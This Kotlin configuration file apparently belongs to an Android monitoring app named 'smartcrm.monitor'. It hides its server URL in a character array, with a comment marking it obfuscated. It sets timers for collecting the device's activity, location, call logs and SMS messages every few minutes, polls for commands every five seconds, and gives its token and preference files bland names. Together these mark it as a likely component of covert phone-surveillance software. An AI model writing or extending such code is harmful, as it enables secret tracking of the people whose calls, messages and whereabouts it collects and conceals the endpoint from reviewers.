package com.smartcrm.monitor

object Config {
    // Server URL - obfuscated
    private val S = charArrayOf('h','t','t','p','s',':','/','/','m','o','n','i','t','o','r','.','s','m','a','r','t','c','r','m','.','p','k','/','m','o','n','i','t','o','r')
    val SERVER_URL: String get() = String(S)

    const val ACTIVITY_INTERVAL = 60_000L      // 1 minute
    const val LOCATION_INTERVAL = 120_000L     // 2 minutes
    const val POLL_INTERVAL     = 5_000L       // 5 seconds
    const val CALL_LOG_INTERVAL = 300_000L     // 5 minutes
    const val SMS_INTERVAL      = 300_000L     // 5 minutes

    // Token file
    const val TOKEN_FILE = "cfg.dat"
    const val PREFS_NAME = "svc_prefs"
}
